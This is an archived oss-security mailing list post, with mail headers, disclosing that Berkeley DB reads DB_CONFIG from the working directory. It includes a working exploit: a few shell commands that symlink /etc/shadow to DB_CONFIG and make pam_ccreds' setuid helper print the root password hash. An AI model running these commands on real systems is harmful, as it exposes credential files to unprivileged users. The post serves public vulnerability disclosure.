X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["689" "Sunday" "11" "June" "2017" "00:06:13" "+0200" "Jakub Wilk" "jwilk@jwilk.net" "<20170610220613.mfmmpjey2l4aptcj@jwilk.net>" "22" "[oss-security] Berkeley DB reads DB_CONFIG from cwd" "^Date:" nil nil "6" "2017061022:06:13" "[oss-security] Berkeley DB reads DB_CONFIG from cwd" (number mark "        jwilk@jwilk. Jun 11   22/689   " thread-indent "\"[oss-security] Berkeley DB reads DB_CONFIG from cwd\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 13584 invoked by uid 550); 10 Jun 2017 22:06:33 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 13541 invoked from network); 10 Jun 2017 22:06:31 -0000
Message-ID: <20170610220613.mfmmpjey2l4aptcj@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Disposition: inline
User-Agent: NeoMutt/20170306 (1.8.0)
X-Ovh-Tracer-Id: 7880173450836498342
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrfeeljedrieejgddujeefucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecuqfggjfdpvefjgfevmfevgfenuceurghilhhouhhtmecufedttdenuc
Date: Sun, 11 Jun 2017 00:06:13 +0200
From: Jakub Wilk <jwilk@jwilk.net>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Berkeley DB reads DB_CONFIG from cwd
To: oss-security@lists.openwall.com

Apparently Berkeley DB reads the DB_CONFIG configuration file from the current 
working directory by default[*]. This is surprising and AFAICT undocumented.

Here's how to exploit it against pam_ccreds:

    $ cat /etc/shadow
    cat: /etc/shadow: Permission denied
    $ ln -sf /etc/shadow DB_CONFIG
    $ /sbin/ccreds_chkpwd moo < /dev/null
    BDB1584 line 1: root:$1$QRCEVRMX$sPppjXE42AZnUPuEWf87D.:17327:0:99999:7:::: incorrect name-value pair

(The above was tested on Debian jessie.)

In the past, nss_db was also exploitable:
CVE-2010-0826


[*] More precisely, this seem to happen when you call db_create() with 
dbenv=NULL; or if you use the dbm_open() function.

-- 
Jakub Wilk
